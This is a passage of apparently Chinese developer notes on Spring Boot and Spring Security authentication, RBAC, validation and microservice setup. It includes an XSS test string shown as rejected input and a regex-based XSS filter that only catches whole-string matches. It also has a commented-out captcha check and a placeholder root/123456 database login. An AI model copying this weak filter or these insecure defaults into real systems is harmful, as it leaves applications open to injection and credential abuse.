UsernamePasswordAuthenticationToken(username, password); AuthenticationContextHolder.setContext(authenticationToken); // 该方法会去调用UserDetailsServiceImpl.loadUserByUsername authentication = authenticationManager.authenticate(authenticationToken); } catch (Exception e) { if (e instanceof BadCredentialsException) { String message = MessageUtils.message(\u0026#34;user.password.not.match\u0026#34;); asyncService.recordLogininfor(username, Constants.LOGIN_FAIL, message); throw new ServiceException(message); } else { asyncService.recordLogininfor(username, Constants.LOGIN_FAIL, e.getMessage()); throw new ServiceException(e.getMessage()); } } asyncService.recordLogininfor(username, Constants.LOGIN_SUCCESS, MessageUtils.message(\u0026#34;user.login.success\u0026#34;)); LoginUser loginUser = (LoginUser) authentication.getPrincipal(); recordLoginInfo(loginUser.getUserId()); // 生成token return tokenService.createToken(loginUser); } 5.登出模块 SecurityConfig中添加登出过滤链\n1 2 // 添加Logout filter httpSecurity.logout().logoutUrl(\u0026#34;/logout\u0026#34;).logoutSuccessHandler(logoutSuccessHandler); LogoutSuccessHandlerImpl自定义退出处理类 返回成功\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 @Configuration public class LogoutSuccessHandlerImpl implements LogoutSuccessHandler { @Autowired private TokenService tokenService; @Autowired private IAsyncService asyncService; /** * 退出处理 * * @return */ @Override public void onLogoutSuccess(HttpServletRequest request, HttpServletResponse response, Authentication authentication) throws IOException, ServletException { LoginUser loginUser = tokenService.getLoginUser(request); if (StringUtils.isNotNull(loginUser)) { String userName = loginUser.getUsername(); // 删除用户缓存记录 tokenService.delLoginUser(loginUser.getToken()); // 记录用户退出日志 asyncService.recordLogininfor(userName, Constants.LOGOUT, \u0026#34;退出成功\u0026#34;); } ServletUtils.renderString(response, JSON.toJSONString(ApiResponse.error(HttpStatus.SUCCESS, \u0026#34;退出成功\u0026#34;))); } } 6.注册模块 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 public String register(RegisterDTO registerBody) { String msg = \u0026#34;\u0026#34;, username = registerBody.getUsername(), password = registerBody.getPassword(); boolean captchaEnabled = configService.selectCaptchaEnabled(); // 验证码开关 if (captchaEnabled) { // validateCaptcha(username, registerBody.getCode(), registerBody.getUuid()); } if (StringUtils.isEmpty(username)) { msg = \u0026#34;用户名不能为空\u0026#34;; } else if (StringUtils.isEmpty(password)) { msg = \u0026#34;用户密码不能为空\u0026#34;; } else if (username.length() \u0026lt; UserConstants.USERNAME_MIN_LENGTH || username.length() \u0026gt; UserConstants.USERNAME_MAX_LENGTH) { msg = \u0026#34;账户长度必须在2到20个字符之间\u0026#34;; } else if (password.length() \u0026lt; UserConstants.PASSWORD_MIN_LENGTH || password.length() \u0026gt; UserConstants.PASSWORD_MAX_LENGTH) { msg = \u0026#34;密码长度必须在5到20个字符之间\u0026#34;; } else if (UserConstants.NOT_UNIQUE.equals(userService.checkUserNameUnique(username))) { msg = \u0026#34;保存用户\u0026#39;\u0026#34; + username + \u0026#34;\u0026#39;失败，注册账号已存在\u0026#34;; } else { SysUser sysUser = new SysUser(); sysUser.setUserName(username); sysUser.setPassword(SecurityUtils.encryptPassword(registerBody.getPassword())); boolean regFlag = userService.registerUser(sysUser); if (!regFlag) { msg = \u0026#34;注册失败,请联系系统管理人员\u0026#34;; } else { asyncService.recordLogininfor(username, Constants.REGISTER, MessageUtils.message(\u0026#34;user.register.success\u0026#34;)); } } return msg; } 授权实现 1.创建数据库表 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 -- ---------------------------- -- 角色信息表 -- ---------------------------- drop table if exists sys_role; create table sys_role ( role_id bigint(20) not null auto_increment comment \u0026#39;角色ID\u0026#39;, role_name varchar(30) not null comment \u0026#39;角色名称\u0026#39;, role_key varchar(100) not null comment \u0026#39;角色权限字符串\u0026#39;, role_sort int(4) not null comment \u0026#39;显示顺序\u0026#39;, data_scope char(1) default \u0026#39;1\u0026#39; comment \u0026#39;数据范围（1：全部数据权限 2：自定数据权限 3：本部门数据权限 4：本部门及以下数据权限）\u0026#39;, menu_check_strictly tinyint(1) default 1 comment \u0026#39;菜单树选择项是否关联显示\u0026#39;, dept_check_strictly tinyint(1) default 1 comment \u0026#39;部门树选择项是否关联显示\u0026#39;, status char(1) not null comment \u0026#39;角色状态（0正常 1停用）\u0026#39;, del_flag char(1) default \u0026#39;0\u0026#39; comment \u0026#39;删除标志（0代表存在 2代表删除）\u0026#39;, create_by varchar(64) default \u0026#39;\u0026#39; comment \u0026#39;创建者\u0026#39;, create_time datetime comment \u0026#39;创建时间\u0026#39;, update_by varchar(64) default \u0026#39;\u0026#39; comment \u0026#39;更新者\u0026#39;, update_time datetime comment \u0026#39;更新时间\u0026#39;, remark varchar(500) default null comment \u0026#39;备注\u0026#39;, primary key (role_id) ) engine=innodb auto_increment=100 comment = \u0026#39;角色信息表\u0026#39;; -- ---------------------------- -- 菜单权限表 -- ---------------------------- drop table if exists sys_menu; create table sys_menu ( menu_id bigint(20) not null auto_increment comment \u0026#39;菜单ID\u0026#39;, menu_name varchar(50) not null comment \u0026#39;菜单名称\u0026#39;, parent_id bigint(20) default 0 comment \u0026#39;父菜单ID\u0026#39;, order_num int(4) default 0 comment \u0026#39;显示顺序\u0026#39;, path varchar(200) default \u0026#39;\u0026#39; comment \u0026#39;路由地址\u0026#39;, component varchar(255) default null comment \u0026#39;组件路径\u0026#39;, query varchar(255) default null comment \u0026#39;路由参数\u0026#39;, is_frame int(1) default 1 comment \u0026#39;是否为外链（0是 1否）\u0026#39;, is_cache int(1) default 0 comment \u0026#39;是否缓存（0缓存 1不缓存）\u0026#39;, menu_type char(1) default \u0026#39;\u0026#39; comment \u0026#39;菜单类型（M目录 C菜单 F按钮）\u0026#39;, visible char(1) default 0 comment \u0026#39;菜单状态（0显示 1隐藏）\u0026#39;, status char(1) default 0 comment \u0026#39;菜单状态（0正常 1停用）\u0026#39;, perms varchar(100) default null comment \u0026#39;权限标识\u0026#39;, icon varchar(100) default \u0026#39;#\u0026#39; comment \u0026#39;菜单图标\u0026#39;, create_by varchar(64) default \u0026#39;\u0026#39; comment \u0026#39;创建者\u0026#39;, create_time datetime comment \u0026#39;创建时间\u0026#39;, update_by varchar(64) default \u0026#39;\u0026#39; comment \u0026#39;更新者\u0026#39;, update_time datetime comment \u0026#39;更新时间\u0026#39;, remark varchar(500) default \u0026#39;\u0026#39; comment \u0026#39;备注\u0026#39;, primary key (menu_id) ) engine=innodb auto_increment=2000 comment = \u0026#39;菜单权限表\u0026#39;; -- ---------------------------- -- 角色和菜单关联表 角色1-N菜单 -- ---------------------------- drop table if exists sys_role_menu; create table sys_role_menu ( role_id bigint(20) not null comment \u0026#39;角色ID\u0026#39;, menu_id bigint(20) not null comment \u0026#39;菜单ID\u0026#39;, primary key(role_id, menu_id) ) engine=innodb comment = \u0026#39;角色和菜单关联表\u0026#39;; -- ---------------------------- -- 用户和角色关联表 用户N-1角色 -- ---------------------------- drop table if exists sys_user_role; create table sys_user_role ( user_id bigint(20) not null comment \u0026#39;用户ID\u0026#39;, role_id bigint(20) not null comment \u0026#39;角色ID\u0026#39;, primary key(user_id, role_id) ) engine=innodb comment = \u0026#39;用户和角色关联表\u0026#39;; 2.权限过滤器 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 @Component public class JwtAuthenticationTokenFilter extends OncePerRequestFilter { @Autowired private TokenService tokenService; @Override protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain chain) throws ServletException, IOException { LoginUser loginUser = tokenService.getLoginUser(request); if (StringUtils.isNotNull(loginUser) \u0026amp;\u0026amp; StringUtils.isNull(SecurityUtils.getAuthentication())) { tokenService.verifyToken(loginUser); // 获取权限信息封装到Authentication中 UsernamePasswordAuthenticationToken authenticationToken = new UsernamePasswordAuthenticationToken(loginUser, null, loginUser.getAuthorities()); authenticationToken.setDetails(new WebAuthenticationDetailsSource().buildDetails(request)); // 存入SecurityContextHolder SecurityContextHolder.getContext().setAuthentication(authenticationToken); } chain.doFilter(request, response); } } 3.登录时权限赋值 在 UserDetailsServiceImpl 的 loadUserByUsername 中为user赋上权限\n4.权限查询Mapper 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;select id=\u0026#34;selectMenuListByUserId\u0026#34; parameterType=\u0026#34;SysMenu\u0026#34; resultMap=\u0026#34;SysMenuResult\u0026#34;\u0026gt; select distinct m.menu_id, m.parent_id, m.menu_name, m.path, m.component, m.`query`, m.visible, m.status, ifnull(m.perms,\u0026#39;\u0026#39;) as perms, m.is_frame, m.is_cache, m.menu_type, m.icon, m.order_num, m.create_time from sys_menu m left join sys_role_menu rm on m.menu_id = rm.menu_id left join sys_user_role ur on rm.role_id = ur.role_id left join sys_role ro on ur.role_id = ro.role_id where ur.user_id = #{params.userId} \u0026lt;if test=\u0026#34;menuName != null and menuName != \u0026#39;\u0026#39;\u0026#34;\u0026gt; AND m.menu_name like concat(\u0026#39;%\u0026#39;, #{menuName}, \u0026#39;%\u0026#39;) \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;visible != null and visible != \u0026#39;\u0026#39;\u0026#34;\u0026gt; AND m.visible = #{visible} \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;status != null and status != \u0026#39;\u0026#39;\u0026#34;\u0026gt; AND m.status = #{status} \u0026lt;/if\u0026gt; order by m.parent_id, m.order_num \u0026lt;/select\u0026gt; 5.自定义权限方法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 @Service(\u0026#34;ss\u0026#34;) public class PermissionService { /** 所有权限标识 */ private static final String ALL_PERMISSION = \u0026#34;*:*:*\u0026#34;; /** 管理员角色权限标识 */ private static final String SUPER_ADMIN = \u0026#34;admin\u0026#34;; private static final String ROLE_DELIMETER = \u0026#34;,\u0026#34;; private static final String PERMISSION_DELIMETER = \u0026#34;,\u0026#34;; /** * 验证用户是否具备某权限 * * @param permission 权限字符串 * @return 用户是否具备某权限 */ public boolean hasPermi(String permission) { if (StringUtils.isEmpty(permission)) { return false; } LoginUser loginUser = SecurityUtils.getLoginUser(); if (StringUtils.isNull(loginUser) || CollectionUtils.isEmpty(loginUser.getPermissions())) { return false; } return hasPermissions(loginUser.getPermissions(), permission); } } 6.接口实现 1 2 3 4 5 6 7 8 9 10 /** * 获取菜单列表 */ @PreAuthorize(\u0026#34;@ss.hasPermi(\u0026#39;system:menu:list\u0026#39;)\u0026#34;) @GetMapping(\u0026#34;/list\u0026#34;) public AjaxResult list(SysMenu menu) { List\u0026lt;SysMenu\u0026gt; menus = menuService.selectMenuList(menu, getUserId()); return AjaxResult.success(menus); } 参数校验 参考链接：\nhttps://blog.csdn.net/qq_37132495/article/details/118804544\n参数检验之\u0026mdash;\u0026mdash;\u0026ndash;BindingResult总结\n参数注解说明 注解名称 功能 @Xss 检查该字段是否存在跨站脚本工具 @Null 检查该字段为空 @NotNull 不能为null @NotBlank 不能为空，常用于检查空字符串 @NotEmpty 不能为空，多用于检测list是否size是0 @Max 该字段的值只能小于或等于该值 @Min 该字段的值只能大于或等于该值 @Past 检查该字段的日期是在过去 @Future 检查该字段的日期是否是属于将来的日期 @Email 检查是否是一个有效的email地址 @Pattern(regex=,flag=) 被注释的元素必须符合指定的正则表达式 @Range(min=,max=,message=) 被注释的元素必须在合适的范围内 @Size(min=, max=) 检查该字段的size是否在min和max之间，可以是字符串、数组、集合、Map等 @Length(min=,max=) 检查所属的字段的长度是否在min和max之间,只能用于字符串 @AssertTrue 用于boolean字段，该字段只能为true @AssertFalse 该字段的值只能为false 1.pom.xml 1 2 3 4 5 \u0026lt;!-- 自定义验证注解 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-validation\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; 2.校验注解 1.在controller上声明@Validated需要对数据进行校验\n1 2 3 4 @GetMapping(\u0026#34;/args\u0026#34;) public String argsTest(@Validated @RequestBody SysUser sysUser){ return \u0026#34;success\u0026#34;; } 2.在对应字段Get方法加上参数校验注解，如果不符合验证要求，则会以message的信息为准，返回给前端\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 public class SysUser extends BaseEntity { ... // @Xss(message = \u0026#34;用户账号不能包含脚本字符\u0026#34;) @NotBlank(message = \u0026#34;用户账号不能为空\u0026#34;) @Size(min = 0, max = 30, message = \u0026#34;用户账号长度不能超过30个字符\u0026#34;) public String getUserName() { return userName; } public void setUserName(String userName) { this.userName = userName; } @Email(message = \u0026#34;邮箱格式不正确\u0026#34;) @Size(min = 0, max = 50, message = \u0026#34;邮箱长度不能超过50个字符\u0026#34;) public String getEmail() { return email; } public void setEmail(String email) { this.email = email; } @Size(min = 0, max = 11, message = \u0026#34;手机号码长度不能超过11个字符\u0026#34;) public String getPhonenumber() { return phonenumber; } ... } 也可以直接放在字段上面声明。\n1 2 @Size(min = 0, max = 30, message = \u0026#34;用户昵称长度不能超过30个字符\u0026#34;) private String nickName; 3.异常捕获 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 /** * 自定义验证异常 */ @ExceptionHandler(BindException.class) public ApiResponse handleBindException(BindException e, HttpServletRequest request) { // log.error(e.getMessage(), e); // String message = e.getAllErrors().get(0).getDefaultMessage(); // return ApiResponse.error(message); String requestURI = request.getRequestURI(); ApiResponse apiResponse = handleBindingResult(e.getBindingResult()); log.error(\u0026#34;请求地址[ {} ], 发生参数校验异常 \u0026#39;BindException\u0026#39; : {}\u0026#34;, requestURI , apiResponse.get(\u0026#34;msg\u0026#34;)); return apiResponse; } /** * 自定义验证异常 参数校验异常处理 */ @ExceptionHandler(MethodArgumentNotValidException.class) public Object handleMethodArgumentNotValidException(MethodArgumentNotValidException e, HttpServletRequest request) { // log.error(e.getMessage(), e); // String message = e.getBindingResult().getFieldError().getDefaultMessage(); // return ApiResponse.error(message); String requestURI = request.getRequestURI(); ApiResponse apiResponse = handleBindingResult(e.getBindingResult()); log.error(\u0026#34;请求地址[ {} ], 发生参数校验异常 \u0026#39;MethodArgumentNotValidException\u0026#39; : {}\u0026#34;, requestURI , apiResponse.get(\u0026#34;msg\u0026#34;)); return apiResponse; } /** * 处理参数校验异常信息 * @param result * @return */ private ApiResponse handleBindingResult(BindingResult result) { List\u0026lt;String\u0026gt; errorList = new ArrayList\u0026lt;\u0026gt;(); if (result.hasErrors()) { List\u0026lt;FieldError\u0026gt; list = result.getFieldErrors(); for (FieldError error : list) { String message = \u0026#34;\u0026lt;\u0026#34;+ error.getField() + \u0026#34;\u0026gt;校验不通过：\u0026#34; + error.getDefaultMessage(); errorList.add(message); } } if (errorList.size() == 0) { return ApiResponse.error(); } // A0002-参数校验异常 return ApiResponse.error(result.getObjectName()+ \u0026#34;:\u0026#34; + errorList.toString()); } 自定义注解校验 1、新增Xss注解，设置自定义校验器XssValidator.class\n其中的validatedBy属性指定了需要进行校验的策略类集合，这是一个数组。XssValidator.class是自定义的校验器，具体的逻辑由这个校验器来完成。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 /** * 自定义xss校验注解 * */ @Retention(RetentionPolicy.RUNTIME) @Target(value = { ElementType.METHOD, ElementType.FIELD, ElementType.CONSTRUCTOR, ElementType.PARAMETER }) @Constraint(validatedBy = { XssValidator.class }) public @interface Xss { String message() default \u0026#34;不允许任何脚本运行\u0026#34;; Class\u0026lt;?\u0026gt;[] groups() default {}; Class\u0026lt;? extends Payload\u0026gt;[] payload() default {}; } 2、自定义Xss校验器，实现ConstraintValidator接口。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 /** * 自定义xss校验注解实现 * */ public class XssValidator implements ConstraintValidator\u0026lt;Xss, String\u0026gt; { private final String HTML_PATTERN = \u0026#34;\u0026lt;(\\\\S*?)[^\u0026gt;]*\u0026gt;.*?|\u0026lt;.*? /\u0026gt;\u0026#34;; @Override public boolean isValid(String value, ConstraintValidatorContext constraintValidatorContext) { return !containsHtml(value); } public boolean containsHtml(String value) { Pattern pattern = Pattern.compile(HTML_PATTERN); Matcher matcher = pattern.matcher(value); return matcher.matches(); } } 3、实体类使用自定义的@Xss注解\n1 2 3 4 5 6 7 @Xss(message = \u0026#34;登录账号不能包含脚本字符\u0026#34;) @NotBlank(message = \u0026#34;登录账号不能为空\u0026#34;) @Size(min = 0, max = 30, message = \u0026#34;登录账号长度不能超过30个字符\u0026#34;) public String getLoginName() { return loginName; } 此时在去保存会进行验证，如果不符合规则的字符（例如\u0026lt;script\u0026gt;alert(1);\u0026lt;/script\u0026gt;）会提示登录账号不能包含脚本字符，代表限制成功。\n4、xss过滤器 ==TODO==\n防重复提交 @RepeatSubmit\n菜单控制 数据库 微服务 参考连接\nspringcloud教程 \u0026ndash; 1.快速搭建入门级demo,看这一篇就够了\n创建一个新的工程lab-drive\n1.添加依赖 父级pom文件\n1 2 3 4 5 \u0026lt;modules\u0026gt; \u0026lt;module\u0026gt;lab-admin\u0026lt;/module\u0026gt; \u0026lt;module\u0026gt;lab-common\u0026lt;/module\u0026gt; \u0026lt;module\u0026gt;lab-drive\u0026lt;/module\u0026gt; +++++ \u0026lt;/modules\u0026gt; 子级pom文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-test\u0026lt;/artifactId\u0026gt; \u0026lt;exclusions\u0026gt; \u0026lt;exclusion\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-logging\u0026lt;/artifactId\u0026gt; \u0026lt;/exclusion\u0026gt; \u0026lt;/exclusions\u0026gt; \u0026lt;scope\u0026gt;test\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- SpringBoot Web容器 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-web\u0026lt;/artifactId\u0026gt; \u0026lt;!--以下是排除的组件--\u0026gt; \u0026lt;exclusions\u0026gt; \u0026lt;!--排除默认自带的log组件--\u0026gt; \u0026lt;exclusion\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-logging\u0026lt;/artifactId\u0026gt; \u0026lt;/exclusion\u0026gt; \u0026lt;/exclusions\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!--log4j2日志相关 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-log4j2\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- SpringBoot yml配置文件编写智能提示 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-configuration-processor\u0026lt;/artifactId\u0026gt; \u0026lt;optional\u0026gt;true\u0026lt;/optional\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- pagehelper 分页插件 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.github.pagehelper\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;pagehelper-spring-boot-starter\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!--mysql驱动 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;mysql\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mysql-connector-java\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- swagger3--\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;io.springfox\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;springfox-boot-starter\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- 防止进入swagger页面报类型转换错误，排除3.0.0中的引用，手动增加1.6.2版本 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;io.swagger\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;swagger-models\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.6.2\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- knife4j --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.github.xiaoymin\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;knife4j-spring-boot-starter\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.0.3\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!--项目common通用工具类 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.opengms\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;lab-common\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.0.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!--nacos注册中心--\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-starter-alibaba-nacos-discovery\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-starter-bootstrap\u0026lt;/artifactId\u0026gt; \u0026lt;!--\u0026lt;version\u0026gt;3.1.0\u0026lt;/version\u0026gt;--\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; \u0026lt;build\u0026gt; \u0026lt;plugins\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-maven-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.1.1.RELEASE\u0026lt;/version\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;fork\u0026gt;true\u0026lt;/fork\u0026gt; \u0026lt;!-- 如果没有该配置，devtools不会生效 --\u0026gt; \u0026lt;/configuration\u0026gt; \u0026lt;executions\u0026gt; \u0026lt;execution\u0026gt; \u0026lt;!--打成可执行的运行包（.jar .war）--\u0026gt; \u0026lt;goals\u0026gt; \u0026lt;goal\u0026gt;repackage\u0026lt;/goal\u0026gt; \u0026lt;/goals\u0026gt; \u0026lt;/execution\u0026gt; \u0026lt;/executions\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;groupId\u0026gt;org.apache.maven.plugins\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;maven-war-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.1.0\u0026lt;/version\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;failOnMissingWebXml\u0026gt;false\u0026lt;/failOnMissingWebXml\u0026gt; \u0026lt;warName\u0026gt;${project.artifactId}\u0026lt;/warName\u0026gt; \u0026lt;/configuration\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;/plugins\u0026gt; \u0026lt;finalName\u0026gt;${project.artifactId}\u0026lt;/finalName\u0026gt; \u0026lt;/build\u0026gt; yaml\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 # 项目相关配置 container: # 名称 name: OpenGMS-Lab-Container # 版本 version: 1.0.0 # 版权年份 copyrightYear: 2022 # 文件路径 示例（ Windows配置E:/opengms-lab/uploadPath，Linux配置 /home/opengms-lab/uploadPath） # profile: E:/opengms-lab/uploadPath # 开发环境配置 server: # 服务器的HTTP端口，默认为8080(8888是jupyter默认端口) port: 8810 servlet: context-path: /container spring: profiles: active: dev datasource: name: lab_datasource url: jdbc:mysql://127.0.0.1:3306/opengms_container?useUnicode=true\u0026amp;characterEncoding=utf8\u0026amp;autoReconnect=true\u0026amp;useSSL=false\u0026amp;serverTimezone=Asia/Shanghai driver-class-name: com.mysql.cj.jdbc.Driver username: root password: 123456 cloud: nacos: server-addr: localhost:8848 discovery: enabled: false application: name: lab-container # Springboot2.6以后将SpringMVC 默认路径匹配策略从AntPathMatcher 更改为PathPatternParser，导致出错 mvc: pathmatch: matching-strategy: ant_path_matcher # MyBatis配置 mybatis: # 搜索指定包别名 typeAliasesPackage: org.opengms.**.entity.po # 配置mapper的扫描，找到所有的mapper.xml映射文件 mapperLocations: classpath*:mapper/**/*Mapper.xml # 加载全局的配置文件 configLocation: classpath:mybatis/mybatis-config.xml # Swagger配置 swagger: # 是否开启swagger enabled: true # 请求前缀 pathMapping: /container #socket配置 socket: host: 127.0.0.1 port: 6001 2.项目配置 拷贝项目基础框架文件及文件夹 entity文件夹中的ApiResponse\nconstant文件夹\nconfig文件夹中的AppConfig\nLabApplication\nlombok.config\n线程、跨域、全局异常配置 线程配置\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 @Configuration @EnableScheduling //同步 @EnableAsync //异步 public class ScheduleConfig { @Bean public TaskExecutor taskExecutor() { ThreadPoolTaskExecutor executor = new ThreadPoolTaskExecutor(); // 设置核心线程数 核心线程数线程数定义了最小可以同时运行的线程数量 executor.setCorePoolSize(3); // 设置最大线程数 当队列中存放的任务达到队列容量的时候，当前可以同时运行的线程数量变为最大线程数 executor.setMaxPoolSize(5); // 设置队列容量 当新任务来的时候会先判断当前运行的线程数量是否达到核心线程数，如果达到的话，信任就会被存放在队列中 executor.setQueueCapacity(200); // 设置线程活跃时间（秒） executor.setKeepAliveSeconds(60); // 设置默认线程名称 executor.setThreadNamePrefix(\u0026#34;AsyncThread-\u0026#34;); // 设置拒绝策略 当最大池被填满时，此策略为我们提供可伸缩队列 executor.setRejectedExecutionHandler(new ThreadPoolExecutor.CallerRunsPolicy()); // 等待所有任务结束后再关闭线程池 executor.setWaitForTasksToCompleteOnShutdown(true); return executor; } } 跨域配置\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 @Configuration public class WebConfig implements WebMvcConfigurer{ //解决跨域问题 @Override public void addCorsMappings(CorsRegistry registry) { registry.addMapping(\u0026#34;/**\u0026#34;); //允许远端访问的域名 // .allowedOrigins(\u0026#34;http://localhost:8099\u0026#34;) //允许请求的方法(\u0026#34;POST\u0026#34;, \u0026#34;GET\u0026#34;, \u0026#34;PUT\u0026#34;, \u0026#34;OPTIONS\u0026#34;, \u0026#34;DELETE\u0026#34;) // .allowedMethods(\u0026#34;*\u0026#34;) //允许请求头 // .allowedHeaders(\u0026#34;*\u0026#34;); } //登录请求问题 @Override public void addInterceptors(InterceptorRegistry registry) { /** * kn4j 在想文档相关的资源 需要放开 */ String[] swaggerPatterns = { \u0026#34;/swagger-resources/**\u0026#34;, \u0026#34;/webjars/**\u0026#34;, \u0026#34;/v2/**\u0026#34;, \u0026#34;/swagger-ui.html/**\u0026#34;, \u0026#34;/doc.html/**\u0026#34; }; registry.addInterceptor(authenticationInterceptor()) .excludePathPatterns(swaggerPatterns) .addPathPatterns(\u0026#34;/**\u0026#34;); // 拦截所有请求，通过判断是否有 @LoginRequired 注解 决定是否需要登录 } @Bean public AuthenticationInterceptor authenticationInterceptor() { return new AuthenticationInterceptor(); } } 全局异常配置\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 @Slf4j @RestControllerAdvice public class GlobalExceptionHandler { /** * 业务异常 */ @ExceptionHandler(ServiceException.class) public ApiResponse handleServiceException(ServiceException e, HttpServletRequest request) { String requestURI = request.getRequestURI(); log.error(\u0026#34;请求地址[ {} ],发生业务异常.\u0026#34;, requestURI, e); Integer code = e.getCode(); return StringUtils.isNotNull(code) ? ApiResponse.error(code, e.getMessage()) : 